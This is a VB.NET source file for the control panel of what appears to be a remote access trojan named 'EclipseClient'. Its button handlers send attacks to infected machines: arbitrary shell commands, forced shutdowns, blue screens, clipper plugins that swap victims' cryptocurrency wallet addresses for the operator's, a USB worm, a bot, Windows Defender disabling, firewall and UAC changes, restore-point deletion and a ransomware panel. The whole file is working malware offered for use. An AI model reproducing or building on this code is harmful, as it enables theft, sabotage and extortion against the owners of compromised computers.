Imports System.Web.UI.HtmlControls
Imports System.ComponentModel
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Web.UI
Imports System.Web.UI.WebControls
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.Status
Imports FireSharp.Config
Imports FireSharp.Interfaces
Imports Microsoft.Win32
Public Class Controlpanel


    Public Shared username_server As String
    Public Sub Trocar_Painel_1(ByVal Painel As Form)
        Page1.Controls.Clear()
        Painel.TopLevel = False
        Page1.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_2(ByVal Painel As Form)
        Page2.Controls.Clear()
        Painel.TopLevel = False
        Page2.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_3(ByVal Painel As Form)
        Page3.Controls.Clear()
        Painel.TopLevel = False
        Page3.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_4(ByVal Painel As Form)
        Page4.Controls.Clear()
        Painel.TopLevel = False
        Page4.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_ransomware(ByVal Painel As Form)
        Page5.Controls.Clear()
        Painel.TopLevel = False
        Page5.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)
        Application.Exit()
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2Button1_Click_1(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "cmd.exe /c calc"
            Dim str3 As String = Interaction.InputBox("Set The Command", "Run Shell", urle)
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("shellfuc" & Settings.SPL & str3)
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub Label10_Click(sender As Object, e As EventArgs) Handles Label10.Click

    End Sub

    Private Sub Menager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Interval = 1000
        Timer1.Enabled = True
        Label6.Text = String.Format("{1}", AuthForm.Lv1.Items.Count.ToString, AuthForm.Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
        Label5.Text = String.Format("{0}", AuthForm.Lv1.Items.Count.ToString, AuthForm.Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
        Label10.Text = username_server
    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click

    End Sub

    Private Sub Guna2Panel4_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2Panel3_Paint(sender As Object, e As PaintEventArgs) Handles Page1.Paint

    End Sub

    Private Sub Page4_Paint(sender As Object, e As PaintEventArgs) Handles Page4.Paint

    End Sub

    Private Sub Guna2Button37_Click(sender As Object, e As EventArgs)



    End Sub

    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button11_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button12_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button22_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown.exe /f /s /t 0")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs) Handles Guna2Button4.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown.exe /f /r /t 0")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button5_Click(sender As Object, e As EventArgs) Handles Guna2Button5.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown -L")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button6_Click(sender As Object, e As EventArgs) Handles Guna2Button6.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\BlankScreen.dll")) & Settings.SPL & "0")
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button7_Click(sender As Object, e As EventArgs) Handles Guna2Button7.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\BlankScreen.dll")) & Settings.SPL & "1")
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button9_Click(sender As Object, e As EventArgs) Handles Guna2Button9.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Settings.SPL & "1")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button10_Click(sender As Object, e As EventArgs) Handles Guna2Button10.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Settings.SPL & "0")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button13_Click(sender As Object, e As EventArgs) Handles Guna2Button13.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("NETINS" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\NetInstall.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button8_Click(sender As Object, e As EventArgs) Handles Guna2Button8.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are You Sure?", "Invoke-BSOD!", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then

                Try

                    Dim B As Byte() = SB("BSOD" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\BSOD.dll")))
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try

            End If
        End If
    End Sub

    Private Sub Guna2Button24_Click(sender As Object, e As EventArgs) Handles Guna2Button24.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "BTC Cilpper", "Your BTC Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button26_Click(sender As Object, e As EventArgs) Handles Guna2Button26.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "ETH Cilpper", "Your ETH Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button28_Click(sender As Object, e As EventArgs) Handles Guna2Button28.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "XMR Cilpper", "Your XMR Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(4)[a-zA-HJ-NP-Z0-9]{90,98}\b")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button30_Click(sender As Object, e As EventArgs) Handles Guna2Button30.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "LTC Cilpper", "Your LTC Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,48}\b")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button34_Click(sender As Object, e As EventArgs) Handles Guna2Button34.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "Doge Cilpper", "Your Doge Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(D)[a-zA-HJ-NP-Z0-9]{26,35}\b")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button33_Click(sender As Object, e As EventArgs) Handles Guna2Button33.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "Dash Cilpper", "Your Dash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button32_Click(sender As Object, e As EventArgs) Handles Guna2Button32.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "BCash Cilpper", "Your BCash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(bitcoincash:|[q])[a-zA-HJ-NP-Z0-9]{26,56}\b")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button31_Click(sender As Object, e As EventArgs) Handles Guna2Button31.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "ZCash Cilpper", "Your ZCash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "t1[0-9A-z]{33}")
                    For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button29_Click(sender As Object, e As EventArgs) Handles Guna2Button29.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("startusb" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Worm.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button27_Click(sender As Object, e As EventArgs) Handles Guna2Button27.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("bot" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Bot.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button25_Click(sender As Object, e As EventArgs) Handles Guna2Button25.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("PSleep" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\PreventSleep.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button23_Click(sender As Object, e As EventArgs) Handles Guna2Button23.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("DelP" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\DeletePoints.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button36_Click(sender As Object, e As EventArgs) Handles Guna2Button36.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\DisableWD.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button35_Click(sender As Object, e As EventArgs) Handles Guna2Button35.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\WDExclusion.dll")))
                For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2Button21_Click(sender As Object, e As EventArgs) Handles Guna2Button21.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Settings.SPL & "0")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button20_Click(sender As Object, e As EventArgs) Handles Guna2Button20.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Settings.SPL & "1")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub Guna2Button19_Click(sender As Object, e As EventArgs) Handles Guna2Button19.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Settings.SPL & "0")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button18_Click(sender As Object, e As EventArgs) Handles Guna2Button18.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Settings.SPL & "1")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub Guna2Button17_Click(sender As Object, e As EventArgs) Handles Guna2Button17.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "netsh advfirewall set allprofiles state on")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Guna2Button16_Click(sender As Object, e As EventArgs) Handles Guna2Button16.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "netsh advfirewall set allprofiles state off")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub Guna2Button14_Click(sender As Object, e As EventArgs) Handles Guna2Button14.Click
        If AuthForm.Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "cmd.exe /c net stop wuauserv && sc config wuauserv start= disabled")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click

    End Sub

    Private Sub Label29_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Label29.Text = Format(Now(), "hh:mm:ss")
    End Sub

    Private Sub btnFeatI_Click(sender As Object, e As EventArgs) Handles btnFeatI.Click
        Guna2Transition1.Hide(Page2)
        Guna2Transition1.Hide(Page3)
        Guna2Transition1.Hide(Page4)
        Guna2Transition1.Hide(Page5)
        Guna2Transition1.ShowSync(Page1)
    End Sub

    Private Sub Guna2Button40_Click(sender As Object, e As EventArgs) Handles Guna2Button40.Click
        Guna2Transition1.Hide(Page1)
        Guna2Transition1.Hide(Page3)
        Guna2Transition1.Hide(Page4)
        Guna2Transition1.Hide(Page5)
        Guna2Transition1.ShowSync(Page2)
    End Sub

    Private Sub Guna2Button39_Click(sender As Object, e As EventArgs) Handles Guna2Button39.Click
        Guna2Transition1.Hide(Page1)
        Guna2Transition1.Hide(Page2)
        Guna2Transition1.Hide(Page4)
        Guna2Transition1.Hide(Page5)
        Guna2Transition1.ShowSync(Page3)
    End Sub

    Private Sub Guna2Button38_Click(sender As Object, e As EventArgs) Handles Guna2Button38.Click
        Guna2Transition1.Hide(Page1)
        Guna2Transition1.Hide(Page2)
        Guna2Transition1.Hide(Page3)
        Guna2Transition1.Hide(Page5)
        Guna2Transition1.ShowSync(Page4)
    End Sub

    Private Sub Guna2Button15_Click(sender As Object, e As EventArgs) Handles Guna2Button15.Click
        Dim cacete As New Ransomware
        Trocar_Painel_ransomware(cacete)
        Guna2Transition1.Hide(Page1)
        Guna2Transition1.Hide(Page2)
        Guna2Transition1.Hide(Page3)
        Guna2Transition1.Hide(Page4)
        Guna2Transition1.ShowSync(Page5)
    End Sub

    Private Sub Guna2Panel3_Paint_1(sender As Object, e As PaintEventArgs) Handles Guna2Panel3.Paint

    End Sub
End Class